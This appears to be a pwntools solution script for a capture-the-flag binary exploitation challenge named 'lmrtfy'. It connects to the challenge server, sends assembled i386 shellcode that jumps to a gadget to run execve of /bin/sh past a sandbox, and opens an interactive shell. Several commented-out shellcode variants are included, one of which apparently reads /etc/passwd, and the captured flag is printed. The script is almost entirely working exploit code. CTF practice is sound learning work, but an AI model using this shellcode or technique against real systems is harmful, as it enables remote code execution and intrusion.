from pwn import *

exe = ELF('lmrtfy')
# context.binary = exe
# context.update(arch='i386', os='linux')
HOST = 'lmrtfy.challs.cyberchallenge.it'
PORT = 9124
p = remote(HOST, PORT)
rop=ROP(exe.path)
#shellcode = asm(shellcraft.sh())
# shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
# shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
#shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
#shellcode="\x6A\x68\x68\x2F\x2F\x2F\x73\x68\x2F\x62\x69\x6E\x89\xE3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xC9\x51\x6A\x04\x59\x01\xE1\x51\x89\xE1\x31\xD2\xFF\x35\x00\x00\x00\x00\x58\xE9\x0D\x87\x04\x08"
#shellcode='\xE9\x0D\x87\x04\x08'


#shellcode="\x31\xC9\xF7\xE1\xB0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2F\x70" +"\x61\x68\x2F\x2F\x65\x74\x89\xE3\xCD\x80\x93\x91\xB0\x03\x66\xBA"+"\xFF\x0F\x42\xCD\x80\x92\xB3\x01\xC1\xE8\x0A\xCD\x80\x93\xCD\x80"
shellcode = """
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
push 0x1010101
xor dword ptr [esp], 0x1016972
xor ecx, ecx
push ecx /* null terminate */
push 4
pop ecx
add ecx, esp
push ecx /* ’sh\x00’ */
mov ecx, esp
xor edx, edx
push SYS_execve /* 0xb */
pop eax
push 0x8049444
ret
"""


#print(rop.dump())
p.recvuntil(b"to run?")
#p.sendline(p32(0x8048711))  # I send him the shellcode and he executes it
p.sendline(asm(shellcode))
p.interactive()

# FLAG --> CCIT{5anDboX1ng_aint_3a5Y}
